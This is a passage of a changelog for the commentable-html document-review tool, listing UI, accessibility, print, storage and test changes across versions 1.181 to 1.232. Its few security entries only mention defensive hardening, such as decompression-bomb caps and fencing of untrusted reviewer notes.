  per-document Share table with per-comment browsing in "Managing storage", and a corrected count-bubble
  description that counts open comment threads plus unresolved note and checklist changes.
  (CMH-HELP-COUNT-01, CMH-HELP-THREADS-01, CMH-HELP-STORE-01)
- The guided tutorial now covers the Manage storage pie-chart breakdown and that the toolbar count
  badge counts note and checklist changes, so no user-facing feature is left off every doc surface.

### Changed

- New governance: every new user-facing feature must declare its documentation surface (tutorial, site,
  or help) - or record an explicit opt-out with a reason - in the SPEC "Doc-surface registry".
  `scripts/check_doc_surfaces.py` (run in the required validate job and the pre-push hook) fails a PR
  whose newly added feature ids lack a doc-surface entry.

## [1.232.0] - 2026-07-24

### Changed

- Comment replies are now composed and edited INLINE in the sidebar thread card (a Word-style
  experience) instead of in a floating popup. Clicking Reply opens an EMPTY editor inside the thread -
  it is never prepopulated with the text of the comment being replied to, and there is no "reply to:"
  quote header; the reply is simply appended to the thread. Editing an existing reply edits it in
  place, prefilled with that reply's own text. (CMH-THREAD-01, CMH-THREAD-05, CMH-THREAD-06,
  CMH-THREAD-07)
- The first reply made without a reviewer name set now reveals the identity editor so the reply can
  be attributed (a non-blocking prompt); the reply still saves unattributed if declined.
  (CMH-THREAD-08)

## [1.231.0] - 2026-07-24

### Changed

- The open-comment count badge (toolbar and sidebar) now includes pending note and checklist changes,
  not just comment threads. A reviewer who only edited an editable note or ticked a checklist item
  previously saw the count stay at 0, as if nothing had been captured; now each changed note (one per
  note) and each changed checklist (one per list) is counted, so the badge reflects that there is
  something to hand back. Widget/layout state changes remain a non-comment signal and are still not
  counted (CMH-STATE-01 unchanged). (CMH-NOTE-04, CMH-CHECK-06)

## [1.230.0] - 2026-07-24

### Changed

- The Manage storage dialog now shows storage consumption ONLY as a four-slice pie chart with a short
  bullet legend beside it, replacing both the previous prose usage summary and the "About X used
  across N documents" total line. The slices are This document,
  Other commentable-html documents (only other real documents), Other (all remaining same-origin data
  - non-commentable-html apps plus commentable-html's shared registry index and preferences), and
  Free (remaining headroom in the assumed ~5 MB budget); the four slices sum to the whole disc. Each
  legend bullet names its slice with a human-readable size and percentage (the accessible text
  alternative), and the pie SVG carries a brief role/aria-label plus a per-slice title as a non-color
  cue. (CMH-STORE-13)

## [1.228.0] - 2026-07-24

### Fixed

- Deck: a right-click on non-interactive slide text now reliably opens the deck comment menu again,
  even when it lands immediately after an empty-space advance click (CMH-DECK-31). The advance
  click's still-pending deferred mouseup selection cleanup could clobber the freshly opened menu, so
  the menu now cancels that pending cleanup when it opens. The menu stays suppressed on `cm-skip`
  deck chrome and on interactive targets. (CMH-DECK-40)

## [1.227.0] - 2026-07-24

### Changed

- Hardened the diagram-gallery legibility tests (CMH-CONTENT-19) to also cover HTML labels. Non-deck
  mermaid diagrams (flowchart, state, class, er) render their node labels as HTML in `<foreignObject>`,
  which the previous svg-`<text>` legibility checks did not measure - so a crushed or transparent HTML
  label would have looked empty in a real browser while every geometry and svg-text assertion stayed
  green. The demo test (`tests/53-more-examples.spec.js`) and the diverse-types hermetic test
  (`tests/76-diagram-gallery.spec.js`) now measure each `foreignObject` label's rendered height and
  paint visibility and assert a legibility floor, and the demo test asserts the demo genuinely includes
  HTML-label diagrams so the check is never vacuously skipped. Documented in `references/mermaid-diagrams.md`
  that an extreme-tall (very high aspect-ratio) diagram is scaled down by the fixed-height gallery and
  reads better as a standalone diagram outside it.

## [1.226.0] - 2026-07-24

### Changed

- The `.cmh-diagram-gallery` helper (CMH-CONTENT-19) now lays diagrams out as a centred FLEX-WRAP of
  UNIFORM-HEIGHT, content-HUGGING cards instead of a grid of uniform fixed-size cards. Every diagram is
  rendered at one fixed HEIGHT with its WIDTH derived from the mermaid viewBox aspect ratio (at natural,
  readable size, with no width clamp), and each card SHRINKS to hug that width up to a generous cap.
  This fixes the cases a fixed-card layout could not: a tall-narrow diagram (a vertical
  `stateDiagram-v2`) no longer slivers into a thin ribbon in an empty wide card - it gets a narrow
  full-height card - and every diagram now fills its card in BOTH dimensions at readable size (no
  letterbox). A diagram too wide for the card keeps its full height and SCROLLS horizontally inside its
  card rather than being crushed into an unreadable strip. Sizing is pure deterministic CSS anchored on
  a definite height, so it renders consistently (geometry-identical) across Chromium, Firefox, and
  WebKit and has no JS-measurement race; the layer's narrow/wide scale-up is disabled inside the
  gallery because it was measurement-timing dependent and rendered diagrams tiny in a real browser
  (while passing headless). A
  `<figure>` card is `width:fit-content` so it hugs its diagram for a short caption, and for a caption
  LONGER than a narrow diagram it grows only to a bounded readable width (`figcaption{max-width:22rem}`)
  with the caption wrapping there and the diagram CENTRED above it (`margin-inline:auto`) - so a long
  caption neither stretches the card to its full length (marooning the diagram in dead space) nor
  collapses to the tiny diagram width (towering into a many-line vertical strip). The caption is itself
  `margin-inline:auto` centred, so a short caption under a diagram wider than the 22rem cap sits centred
  rather than pinned to the card's start edge. When a wide diagram
  makes the figure its own horizontal scroll container, the caption is `position:sticky;
  inset-inline-start:0` so it stays PINNED in the visible card while the diagram scrolls beneath it
  (a static caption scrolled off-screen and stranded the reader without the label); the logical
  `inset-inline-start` pins the correct edge in both LTR and RTL. A diagram wider than the card cap scrolls horizontally with `align-items:flex-start`
  so its start edge stays reachable (a centered over-wide diagram is pushed to a negative
  offset the scroll range excludes, clipping its start), and an overflowing card is made
  keyboard-focusable (WCAG 2.1.1) with a visible focus ring. The gallery tests now assert each diagram FILLS its card in BOTH dimensions (a
  `Math.max`-based single-axis check could not catch a sliver), that no painted content is clipped or
  painted invisible, that text stays legible, that the card height stays at its design size (catching a
  uniform downscale), that an extreme-wide diagram scrolls at full height, that a wide figure's caption
  stays pinned in view (and never overlaps the diagram) while scrolling, and that a long caption wraps
  to a bounded readable width with no tower and the diagram centred - each mutation-verified
  to fail on a reverted/broken render. Documented in `references/mermaid-diagrams.md`.

## [1.225.0] - 2026-07-24

### Fixed

- Markdown export: a `<blockquote>` now recursively serializes its block children (paragraphs,
  lists, code fences, nested blockquotes) so every output line is prefixed with `> `, preserving
  the full GFM structure. Previously `_mdCollapse(_mdInlineText(el))` flattened all block children
  to a single line, losing the nested structure and changing the document's meaning. (CMH-MD-08)
## [1.224.0] - 2026-07-23

### Changed

- Markdown review-note exports now carry an untrusted-data preamble and non-forgeable dynamic fences,
  and strip bidi/invisible formatting controls from note text.
- Portable, Offline, and Plain HTML exports strip authoring session-id and agent provenance by default;
  an explicit retain option preserves it when deliberately requested.

## [1.223.0] - 2026-07-23

### Added

- Accessibility: the text-selection context menu is now a keyboard-operable ARIA menu. Its container
  carries `role="menu"` and each action carries `role="menuitem"` with a roving `tabindex="-1"` (only
  one item is focusable at a time, so Tab does not step through them); opening it moves focus to the
  first visible item, ArrowUp/ArrowDown (and Home/End) rove focus with wrap-around, Tabbing out
  dismisses it cleanly, and Escape closes it and restores focus to the control that was focused when it
  opened.
- Accessibility: the floating per-link add-comment button and the collapsible-section caret now show the
  shared themed `:focus-visible` outline ring, so keyboard focus on either control is clearly visible.
- Accessibility: a sortable table's header cell now reflects the active sort direction via `aria-sort`
  (`ascending` / `descending`) on the `<th>`, removed when the column resets or another column takes the
  sort, so assistive tech announces which column is sorted and how.

## [1.222.0] - 2026-07-23

### Fixed

- Comment search now Unicode-normalizes note text and queries and uses locale-aware casing, so
  canonically equivalent text and Turkish/Azeri dotted or dotless I case pairs match correctly.
  Localized card, popover, and board-summary timestamps isolate the date from any LTR suffix under
  RTL locales, and the inline image tool accepts safe paths whose canonical casing differs on
  case-insensitive filesystems.
  (CMH-SEARCH-06, CMH-SEARCH-07, CMH-SIDE-10, CMH-TOOL-21)

## [1.221.0] - 2026-07-23

### Changed

- Resource-safety hardening across the runtime and tools so large or attacker-controlled input can no
  longer exhaust memory/disk or freeze the tab (issue #619):
  - The session-hook zip extractor (`pkg/hooks/extract_resources.py`) now preflights
    `skill-resources.zip` against entry-count, per-entry size, total-size, and compression-ratio caps
    before writing anything, and streams each member under a per-entry actual-byte cap, so a tampered
    or decompression-bomb archive fails closed (previous version untouched, no marker).
  - The interactive chart derives its y-axis ticks by a bounded integer index (capped at
    `MAX_CHART_TICKS`), so a tiny/zero `data-cmh-chart-step` against a large max can no longer drive an
    unbounded synchronous loop.
  - Large code blocks are bounded like diffs: above `CMH_CODE_MAX_LINES` lines the per-line gutter is
    skipped, and above `CMH_CODE_MAX_CHARS` characters the runtime highlighter leaves the block plain
    (the text stays readable and commentable).
  - The deck `--pptx` local extractor lowers its archive caps, size-caps a single inlined image
    (`MAX_PPTX_IMAGE_BYTES`) and degrades an oversize image gracefully - dropping its extracted temp
    path (never emitting a dangling `assets/...` reference) and replacing it with a visible
    placeholder carrying the alt text so the fragment stays self-contained - and runs the vendored
    extractor subprocess under a hard wall-clock timeout (`PPTX_EXTRACT_TIMEOUT_SECONDS`) that fails
    closed.
  - Comment restore/backfill at startup reuse ONE `getTextNodes()` scan across per-comment
    `rangeFromOffsets()` lookups (rebuilding only after a DOM-mutating wrap) and cap context capture at
    `CMH_MAX_BACKFILL`, so a flood of finite-but-unresolvable comments no longer does
    O(comment_count x document_size) work.
## [1.220.0] - 2026-07-23

### Changed

- The Manage storage dialog is clearer and more capable (CMH-STORE-13..16). Documents are now shown
  in a column-headed table (Document, Comments, Size, Share, Actions) where the Share column is each
  document's percentage of commentable-html storage. A usage summary reports total local storage in
  use as a percentage of the assumed ~5 MB budget, the commentable-html share of the storage in use,
  and this document's percentage of commentable-html storage. Each document row has a lazy "Show
  comments" toggle that lists every stored comment (quote, note, author, and an approximate
  per-comment size), each deletable - deleting a comment in the current document routes through the
  live delete path (tombstoning embedded ids and re-rendering the sidebar), while deleting another
  document's comment rewrites only that document's stored slot. A Close button was added in a footer
  at the bottom of the dialog.

## [1.215.0] - 2026-07-23

### Added

- A shipped `.cmh-diagram-gallery` layout helper for showing several diagrams/figures of very
  different aspect ratios robustly (CMH-CONTENT-19). It is a plain CSS grid of uniform,
  height-bounded, framed cards: every card is the same height (no marooning of a short diagram
  beside a tall one), a diagram taller than its card scrolls inside it instead of being shrunk (no
  sliver), and there is no CSS multi-column (which is fragile with mermaid's dynamic sizing and
  produced tiny/empty diagrams in a real browser). Documented in `references/mermaid-diagrams.md`.

### Changed

- The visuals-matrix demo (`report-metrics.html`) Mermaid gallery now uses `.cmh-diagram-gallery`
  instead of a hand-rolled per-document grid/masonry, retiring the layout that failed repeatedly
  (marooning in #597, sliver/masonry in #602/#610). This is the durable, tested fix for the demo's
  gallery rendering (CMH-DEMO-06).

## [1.214.0] - 2026-07-22

### Added

- Flat (non-deck) documents now print / Save-as-PDF as a SINGLE continuous no-break page instead of
  paginating onto A4/Letter sheets, so no page break cuts through a section, table, chart, diagram,
  or code block. On print the runtime measures the full content height (proactively, under stable
  screen media, since Chromium locks the print `@page` size at `beforeprint`) and sizes a dynamic
  `@page` to the content, collapsing a multi-page report onto one tall page. Documents that contain a
  block-stacking container - a multi-column chart gallery or a grid/flex widget such as a kanban
  board - are left on normal pagination, because their print-time grid-to-block reflow and
  asynchronous chart resize cannot be measured before the page size is locked; their content still
  prints in full on standard pages. Decks are unchanged (one landscape 16:9 page per slide). Relies
  on the browser honoring a CSS `@page` size (Chromium's native print/PDF). (CMH-PRINT-06)

## [1.213.0] - 2026-07-22

### Changed

- Guarded sibling-tool imports in the shipped tools are never SILENT anymore. The #584 root cause was
  a deferred `import doc_stamp` swallowed by `except (OSError, ImportError): pass`, so a broken
  sibling import degraded a whole feature with no signal. Now every guarded import fallback across the
  tools (`new_document.py`, `deck_scaffold.py`, `retrofit.py`, `upgrade.py`, `deck_theme.py`,
  `deck_validate.py`, `chart_block.py`, `highlighting.py`, and `validate.py`'s `cmhval` and
  validated-stamp guards) emits a one-line stderr warning via a new `_toolpath.warn_missing_tool` (or
  unconditionally re-raises / recovers by re-importing), so a degraded run is visible. A guard test
  (`test_tool_imports.py`) additionally proves every guarded sibling import RESOLVES in the shipped
  layout (a missing/renamed sibling fails CI loudly) and structurally forbids any future silent
  import fallback - covering `except ImportError`, `ModuleNotFoundError`, and import-guarding broad /
  bare `except` handlers across the whole shipped tools tree. (CMH-TOOL-IMPORTS-01)

## [1.212.0] - 2026-07-22

### Fixed

- The runtime footer is now flush with the content column when the side table-of-contents
  navigation pane is present and the comments sidebar is closed. Previously, on viewports where the
  pane's left inset shrank the content shell below its max width, the footer spanned wider than the
  content column (about 1.5rem past it on each side). The footer now insets to match the content box
  in that layout.

## [1.211.0] - 2026-07-22

### Added

- Manage storage: a near-full-screen dialog (from the overflow / sidebar menu) that lists every
  commentable-html document's data stored in this browser, with a human-readable size and comment
  count, and lets you delete another document's data to reclaim space. On `file://` all documents
  share one browser storage budget, so this is how you free room when it fills up. The current
  document is marked and offers "Clear all comments" instead of Delete; deletion is scoped to
  commentable-html's own keys, so unrelated site data is never touched. (CMH-STORE-04, CMH-STORE-05,
  CMH-STORE-06, CMH-STORE-08)
- If saving a comment fails because storage is full, the Manage storage dialog now opens
  automatically; freeing space retries the save so the comment is not lost. Notes, checklists, and
  section-review saves that hit the same limit surface a "Manage storage" action on their warning
  toast, and closing the dialog while any save is still pending re-offers that recovery action so
  nothing is lost silently. (CMH-STORE-07)

### Changed

- Comments are now stored compressed (lz-string, packed into UTF-16) when that is smaller than plain
  JSON, so far more documents' reviews fit in the shared browser storage. The format is backward
  compatible: documents last saved by an older version still load and are migrated on the next save,
  and a stored value that cannot be read (a corrupt or newer-version format) is left untouched with a
  recovery notice rather than being overwritten. (CMH-STORE-01, CMH-STORE-02, CMH-STORE-03)

## [1.210.0] - 2026-07-22

### Added

- The runtime footer now ends with a "Report an issue" link, placed to the right of the
  "Help & about" control, that opens the plugin's GitHub issue form in a new tab. Like the rest of
  the footer it is `cm-skip` chrome, so it never leaks into a Plain HTML export.

### Changed

- On wide screens with the comments sidebar open, the document content column now targets a wider
  1600px column (up from 1300px), so the body fills more of the space between the navigation pane
  and the sidebar instead of leaving a large empty gutter. When the side table-of-contents
  navigation pane is present, the layout now subtracts that pane's width so the content still
  reaches its full width between the pane and the sidebar rather than being squeezed. The runtime
  footer tracks the same widened column so it stays flush with the content.

### Fixed

- The footer session-id copy control no longer renders two separator dots next to each other
  (`Generated . . [copy]`); the copy button and its separator now read `Generated . [copy] . Help`.

## [1.209.0] - 2026-07-22

### Fixed

- `validate.py` now actually stamps a document when run as a standalone CLI subprocess. It
  previously put only its own `validate/` directory on `sys.path`, so `_stamp_validated_file`'s
  `import doc_stamp` silently failed and a clean `python tools/validate/validate.py <file>` left the
  document unstamped - the runtime kept showing the amber "not validated" banner even though
  validation passed. `validate.py` now loads the sibling `authoring/` tools via the shared bootstrap,
  so both `validate.py` and `finalize.py` stamp on a strict-clean pass. (CMH-STAMP-02, part of #584)

### Added

- The validated stamp is now CONTENT-BOUND to the document's authored TEXT. On a strict-clean pass
  `validate.py`/`finalize.py` also write `commentable-html-validated-hash`, a whole content-root text
  hash computed with the shared section-hash contract, and the runtime reproduces it byte for byte
  (`window.__cmhReview.docHash()`). The amber "not validated" banner therefore returns after a
  post-validation edit to the visible authored text and clears again on re-validation, instead of
  relying only on timestamps - so "validated" now tracks the CURRENT text. It is a stable-text
  fingerprint (a strong nudge, not a cryptographic seal): it does not track attribute-only edits or
  edits inside the excluded rendered blocks (mermaid/diff/KQL/chart/notes). A document with no
  content root keeps a timestamp-only stamp and the runtime falls back to the timestamp signal, so it
  never false-positives; a reader's persisted table sort is canonicalized so it does not falsely
  invalidate. Only a FULL clean validation stamps (a `--charts-only`/`--layer-only` partial run never
  does). `finalize.py` also prints a guardrail reminder on a strict-fail that the fix must end with a
  clean strict pass to re-stamp. (CMH-STAMP-05, CMH-STAMP-03, CMH-STAMP-02, closes #584)

## [1.208.0] - 2026-07-22

### Added

- Review comment notes now support lightweight rich text (WhatsApp / Office style), rendered safely
  wherever a note is shown (sidebar card, inline popover, print appendix): `**bold**`, `*italic*`,
  `__underline__`, `~~strikethrough~~`, inline code, `- ` bullet lists, markdown-style links
  (http/https/mailto only), and bare `http(s)://` URLs auto-linked as clickable, new-tab, safe
  anchors. A single-pass tokenizer escapes all input first and only emits its own fixed tags, so a
  note can never inject markup; unsafe link schemes and hostile input are handled safely.
- The comment composer gained a formatting toolbar (bold, italic, underline, strikethrough, code,
  link, list) that wraps the current selection, plus keyboard shortcuts `Ctrl/Cmd+B` / `I` / `U`
  and `Ctrl/Cmd+K` (link). The stored note stays plain-text source, so Copy all still hands the
  agent the exact markers and old notes remain loadable without any migration. A new "Formatting
  your comment" Help topic and a tutorial section document the markers and shortcuts.

## [1.206.0] - 2026-07-22

### Fixed

- Printing a document or deck to PDF (Save as PDF / Ctrl+P) now renders correctly instead of
  clipping and stranding content. Decks print one landscape 16:9 page per slide (a named `@page`
  sized to the native slide, so a fixed-size slide is never cut off by a portrait page) with each
  slide keeping its authored grid/flex layout and no phantom trailing blank page. Reports no longer
  strand a section heading on a near-blank page: headings stay with their content, whole sections
  flow across pages, multi-column galleries and draggable widgets (kanban boards) block-stack so
  their items flow, and a tall mermaid diagram is scaled to fit one page instead of splitting a node
  across a page break. Chrome injected inside the document (sort controls, section-review badges, the
  widget reset control) is hidden in print. The paper size does not need to be A4/Letter - the goal
  is simply that nothing is clipped and every page carries content. (CMH-PRINT-01, CMH-PRINT-03,
  CMH-PRINT-04)
- A document printed while dark theme is active now prints on light paper: the color-scheme is reset
  to light (so the browser no longer paints the page canvas / margins dark) and syntax-highlighted
  code/KQL/diff tokens are re-lit to a legible palette on the white background. A deck instead keeps
  its own designed dark code backgrounds and bright tokens. (CMH-PRINT-05)
- Added real rendered-PDF CI checks (`tests/70-print-pdf.spec.js`, `CMH-PRINT-03`/`CMH-PRINT-04`/`CMH-PRINT-05`):
  they drive the browser's native print (`page.pdf`) and inspect the produced PDF - page count,
  page geometry, and per-page ink coverage - so a print-layout regression fails CI. The prior print
  tests only checked `@media print` computed styles and never paginated a real PDF.

## [1.204.0] - 2026-07-21

### Changed

- Consolidated the always-loaded `SKILL.md` capability, tool-routing, deterministic-helper, and pre-handoff guidance into one dense tool index while keeping critical triggers and tool routes covered by tests. Deep deck workflow guidance now lives in the on-demand deck references. (CMH-DOC-18)

## [1.203.0] - 2026-07-21

### Fixed

- Copy all now strips Unicode bidirectional formatting controls from reviewer notes, document text,
  the document label, and the document source before emitting the agent payload, so invisible
  direction overrides cannot visually span the trusted fences or metadata lines. Machine-readable
  JSON identifiers escape those controls so note/checklist apply tools still round-trip ids.
  (CMH-COPY-09)

## [1.202.0] - 2026-07-21

### Fixed

- Deleting an embedded comment now retries the tombstone write after saving the smaller comments
  array, so a near-quota browser can free space and persist the delete marker. If the retry still
  fails, the reviewer gets an assertive warning that the embedded comment may reappear after reload
  instead of a silent resurrection. (CMH-PERSIST-05)

## [1.201.0] - 2026-07-21

### Fixed

- Keyboard users can now tab from a focused heading to the floating heading Add Comment button, keep it visible while focused, and continue through the next valid heading controls or links without getting trapped on disabled, inert, or programmatic-only candidates. (CMH-A11Y-08)

## [1.200.0] - 2026-07-21

### Fixed

- Image comments now share one index-plus-src anchor resolver across reload restoration,
  jump-to-comment, edit-composer positioning, and section-review lookup, with image metadata
  disambiguation for duplicate-source images and labelled chart canvases, so a stale image index after
  a document reorders images no longer sends the scroll target or editor to the wrong image.
  (CMH-IMG-07)

## [1.199.1] - 2026-07-21

### Fixed

- Prevented sortable-table reloads from restoring discontiguous multi-row text highlights over unrelated rows while keeping the comment listed and recoverable.

## [1.199.0] - 2026-07-21

### Added

- Collaborative threaded comments with author attribution. A reviewer sets a display name once
  (stored per-browser in `localStorage`, seedable by the author via `data-cm-author`); the sidebar
  "Commenting as" control lets them change it at any time, applying to new comments only. Every
  attributed comment and reply shows a hashed-color author pill at the start of its note. A new
  Reply action threads comments: a thread is an initial comment plus a flat, chronological list of
  replies (single-level), each individually editable and deletable. Deleting a thread root removes
  the whole thread; deleting a reply removes only that reply. Copy all emits each thread as an
  initial comment followed by clearly-labelled refinements (author names neutralized so they cannot
  forge the untrusted-note fence or the machine trailer) and includes every reply id in
  HANDLED_IDS_JSON so a thread is handled and pruned together. Threads round-trip through Export as
  Portable / embedded comments, and orphan replies (missing root) are pruned at load. Markdown
  export and the print appendix are thread-aware. (CMH-AUTHOR-01, CMH-AUTHOR-02, CMH-AUTHOR-03,
  CMH-THREAD-01, CMH-THREAD-02, CMH-THREAD-03, CMH-THREAD-04, CMH-THREAD-05, CMH-THREAD-06)

## [1.198.0] - 2026-07-21

### Added

- A discoverable **Save as PDF** action makes the existing browser-native print/PDF layout reachable
  without knowing a keyboard shortcut. It appears in the toolbar overflow ("More actions") menu and
  in the sidebar Export menu, and triggers the browser's own `window.print()` - zero PDF
  dependencies (no jsPDF or html2canvas). The printout hides the review UI, prints on a clean light
  theme, expands collapsed sections, and appends the current comments. It deliberately does not
  intercept `Ctrl/Cmd+P`, so the browser's own print/PDF shortcut still works unchanged.

## [1.197.0] - 2026-07-21

### Fixed

- Screen readers now announce the FIRST toast of a session. The `#toast` element ships as a live
  region (`role="status"`/`aria-live="polite"`) so it is already live before any toast fires, and
  `showToast` sets the role/politeness before mutating the toast text (a live region added in the
  same tick as its first text change is not announced by most screen readers). (CMH-A11Y-03)
- Marking a section reviewed now warns when the marker cannot be persisted (localStorage full or
  blocked) with an assertive toast, instead of silently painting `Reviewed` and letting it revert on
  reload - symmetric with the existing un-review warning. (CMH-REVIEW-15)

## [1.196.0] - 2026-07-20

### Fixed

- The floating "Add Comment" affordance is now unified across the structural-anchor layers (image,
  mermaid, diff, link, widget, heading): only one button is ever visible at a time. A nested
  `<a><img></a>` (a common clickable thumbnail or logo) previously left both the image and link
  buttons showing at once; now the innermost element owns the affordance deterministically,
  independent of hover-event order, and a dismissed inner button no longer suppresses the enclosing
  layer. (CMH-ANCHOR-01)

## [1.195.0] - 2026-07-20

### Fixed

- The `<head>` mermaid-loader scan used by `tools/authoring/upgrade.py` (when re-emitting the loader
  into an existing document) and by the example build is now comment-aware: a commented-out
  `<head>` or `<script>` block placed before or around the real document head is no longer mistaken
  for the head or the loader, so upgrade/regeneration always targets the real loader and never
  rewrites a decoy inside an HTML comment. The real loader's own preceding `<!-- Mermaid loader -->`
  comment is still detected and stays part of the swapped block. (CMH-MMD-09)

## [1.194.0] - 2026-07-20

### Fixed

- Code and KQL line-number gutters now stay aligned to the text even when a report, deck, or theme
  gives the block an ambient `line-height` of the keyword `normal`. Every code/KQL `<pre>` now
  carries a deterministic numeric `line-height`, so the gutter always reads a stable px line-height
  instead of falling back to a hardcoded `20px` (which left the numbers sitting above the text and
  drifting down a tall block). (CMH-CODE-07)

## [1.193.0] - 2026-07-20

### Fixed

- A standalone built-in canvas chart (`canvas.cmh-chart` with inline `data-cmh-chart-points`/`-source`)
  placed directly in a shrink-to-fit container (`width: max-content`, an `inline-block`, a float, or an
  auto-sized `inline-flex`/grid item) - rather than inside the shipped definite-width `figure.chart >
  .chart-wrap` - no longer renders `dpr x` oversized on a HiDPI screen (`devicePixelRatio > 1`). The
  renderer now measures the chart's logical size against a bitmap reset to the authored size (which is
  devicePixelRatio-independent, so the canvas's own dpr-scaled bitmap cannot drive its container's width
  - the feedback loop - and which preserves the aspect ratio so an auto-height chart is not squared),
  falls back to the authored `width`/`height` attributes when the container collapses without the canvas,
  and pins the box so the chart displays at its intended size; the shipped definite-width chart pattern
  is unaffected (CMH-CHART-10).

## [1.192.0] - 2026-07-20

### Fixed

- Report (non-deck) Mermaid diagrams in the shipped example reports and the deployed-site demos no
  longer collapse to a tiny frozen bar when their section is hidden at load. The examples carried the
  OLD naive in-place `mermaid.run()` loader (a diagram whose section was `display:none` at load
  rendered a degenerate ~16px SVG that never re-measured), because `build.py`'s `regen_example` swaps
  only the CSS / COMMENT UI / JS layer regions and never re-emitted the shell-baked `<head>` mermaid
  loader. `regen_example` now re-emits the canonical loader from `PORTABLE.html` into every example
  (the same `<head>`-scoped, ambiguity-guarded, vendored-safe re-emit `upgrade.py` does), so an
  example single-sources the loader and honors CMH-MMD-07 (CMH-MMD-09).

### Changed

- Report (non-deck) Mermaid diagrams whose natural width is well under the content column now scale
  up toward the column instead of being marooned by mermaid's intrinsic-width inline `max-width`. A
  `cmh-diagram-narrow` class (set by `updateMermaidWidthClass` with hysteresis, so scaling a diagram
  taller cannot flip it back and forth on the reveal/resize observer) grows the SVG to a capped
  `min(100%, natural * 1.4)`, centered, for both `pre.mermaid` and `div.mermaid` hosts. Wide diagrams
  (which scroll) and deck diagrams (own fit) are unaffected (CMH-MMD-10).

## [1.191.0] - 2026-07-20

### Fixed

- The full-screen demo reports on the site (and the shipped `report-taxi.html` /
  `report-community-garden.html` examples) now carry the commentable-html favicon, so a browser
  tab shows the CMH mark instead of the generic globe. Those two example sources predated the
  shell-baked favicon and were the only ones missing it.

### Added

- The validator now warns (an error under `--strict`, the mandatory finalize path) when a document
  has no `<link rel="icon">` favicon in its head, so a missing favicon is caught before handoff
  (CMH-KIND-05). `retrofit.py` injects the CMH favicon when the host head has none, and
  `upgrade.py` adds it when migrating a pre-favicon document (neither duplicates an existing one).
## [1.190.0] - 2026-07-20

### Fixed

- `Clear all comments` now also resets a note-only change. Its early-return guard checked comments,
  widget-state, and checklist changes but omitted `notesChanges()`, so on a document whose only
  pending change was an edited `data-cmh-note` field (no comments, no checklist/widget changes)
  clicking Clear all was a silent no-op and left the note edit in place. The guard now includes note
  changes, and the confirm dialog names the widget, checklist, and note resets it performs.
  (CMH-NOTE-06)

## [1.189.0] - 2026-07-20

### Added

- Each side-TOC review-filter button (All / Reviewed / Unreviewed / Commented / Changed) now shows a
  live per-state count as an inline `(N)` beside its label - `All` shows the total section count and
  the four states partition it, so at a glance you see how many sections are in each state. The count
  refreshes as sections are marked reviewed, commented, or changed. The count span is `aria-hidden`
  and its number is folded into each button's accessible name so it is announced once, and the label
  and count stay on one line per button (the group wraps into rows without overflowing the sidebar,
  even with two-digit counts) (CMH-REVIEW-14).

## [1.188.0] - 2026-07-20

### Fixed

- Showcase deck: the Act 1 Mermaid loop diagram no longer paints solid black blobs. Deck flowchart
  edge connectors are now stroked with `fill: none` (only the arrowhead markers keep a fill), so a
  curved back-edge is drawn as a thin line instead of filling the area under its curve with the dark
  slide color. The fix is both in the runtime deck default (`assets/css/90-deck.css`) and in the
  showcase deck's own parchment mermaid theme (CMH-DECK-09).

### Changed

- Showcase deck slide 12 ("Code and notes") now demonstrates the notes feature with REAL live,
  editable notes (`data-cmh-note` fields the runtime upgrades into editable, change-tracked
  textareas) instead of a static mockup (CMH-DECK-SHOWCASE-08). A note change card's `jump` is now
  deck-aware: `jumpToNote()` activates the note's owning slide before scrolling. To support live
  notes on a slide, the notes authoring validator (`validate.py`) no longer flags a note on a deck
  slide - a slide, unlike a checklist/diff/widget substrate, does not `cm-skip` its descendant text;
  a note nested inside a checklist/diff/widget is still flagged (CMH-NOTE-15).
- Showcase deck slide 18 ("Three portability modes") now tags each part with a colorful source pill
  (folder / CDN / inlined / storage / seed), matching the site's "Three portability modes" theme,
  instead of plain table text; the Portable and Offline handoffs keep both the seed and storage
  pills (CMH-DECK-SHOWCASE-17).

## [1.187.0] - 2026-07-20

### Fixed

- Typing in an editable note (`data-cmh-note`) no longer freezes a large document. The note `input`
  handler used to re-render the whole sidebar synchronously on every keystroke, and that render runs
  two full-document tree walks (a `getTextNodes` walk plus the section-review scan), so each
  keystroke cost O(document) work (hundreds of ms on a report with tens of thousands of text nodes).
  The typing path now persists the edit synchronously but coalesces a keystroke burst into a single
  debounced re-render (a note's document position does not move while its text is edited). The
  lightweight UI (portability badge, Copy-all affordance, first-change sidebar auto-open) updates
  synchronously but only on the note-dirty transition, so a burst does no per-keystroke document
  scan; per-keystroke cost is bounded independent of document size. Programmatic reset / clear-all
  still render immediately. (CMH-NOTE-17)

## [1.185.0] - 2026-07-20

### Changed

- `SKILL.md` now opens with a single upfront `## Capabilities` list (above the detailed Steps) that
  names the tested tool or contract for every capability - create/retrofit/upgrade, the document
  kinds (including the flat `slides` kind vs a real deck), the review surface (including per-section
  "Mark reviewed" tracking), highlighted code, KQL, diffs, mermaid, charts, images, the layout tools,
  layered checklists and editable notes fields (scaffold and apply), commentable widgets, animated
  decks, output modes, and theming (including deck theme presets) - and directs the agent to use the
  named tool rather than invent a novel mechanism. This closes a discovery gap where an agent missed
  that CMH already supports editable notes fields and considered building its own. A companion
  `## Always validate before handoff (MUST)` section states the mandatory
  `finalize.py --strict` + `validate.py --strict` (plus `deck_validate.py --strict` for decks) pass
  upfront so it cannot be missed. (CMH-DOC-17)

## [1.182.0] - 2026-07-20

### Fixed

- Saving a text comment on a selection that overlaps an existing text highlight is now rejected with
  the "Comment was not saved" toast instead of silently nesting a `mark.cm-hl` inside the existing one.
  A nested highlight made the OUTER comment effectively unclickable (click/hover/popover handlers
  resolve to the innermost mark), contradicting CMH-CORE-11. The composer's text-save path now runs a
  `rangeOverlapsHighlight` pre-check (in `assets/js/15-context.js`) BEFORE wrapping - it derives each
  existing highlight's LIVE character interval from a single text-node walk and rejects the save when
  the new selection overlaps one (a half-open test, so it stays correct even when a comment's stored
  offsets are stale relative to the DOM - for example after a table sort leaves a multi-row highlight
  discontiguous - and a touching, non-overlapping adjacent selection is still allowed). `restoreHighlights` (`assets/js/95-startup.js`) applies persisted text comments sorted by
  start and skips wrapping any whose range overlaps one already highlighted (an O(n) sweep), so a
  legacy/crafted overlapping set keeps only the first-applied highlight - mirroring the diff sub-range
  guard - while the overlapping comment stays listed in the sidebar. Editing the existing comment on
  the same range (CMH-CORE-10) is unaffected (CMH-CORE-11).

## [1.181.0] - 2026-07-20

### Fixed

- A built-in canvas chart (a `canvas.cmh-chart` / `figure.chart canvas` with inline
  `data-cmh-chart-points`/`-source`) authored inside a collapsible `<section>` that is collapsed
